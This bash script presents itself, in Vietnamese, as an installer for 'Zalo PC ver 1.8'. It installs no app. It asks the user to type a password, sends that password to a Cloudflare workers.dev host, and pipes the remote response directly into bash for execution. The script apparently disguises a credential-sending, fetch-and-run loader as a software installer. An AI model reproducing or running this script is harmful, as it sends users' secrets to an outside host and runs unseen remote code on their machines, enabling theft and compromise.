#!/bin/bash

set -e

WORKER_URL="https://private-script-sentosa.cloud07622.workers.dev"

echo "================================"
echo "    CÀI ĐẶT ZALO PC VER 1.8     "
echo "================================"
echo

read -rsp "Nhập mật khẩu: " PASSWORD
echo
echo

# Gửi password đến Cloudflare Worker
printf '%s' "$PASSWORD" | python3 -c '
import sys
import json
print(json.dumps({"password": sys.stdin.read()}))
' | curl -fsSL \
    -X POST \
    -H "Content-Type: application/json" \
    --data-binary @- \
    "$WORKER_URL/script" | bash

unset PASSWORD
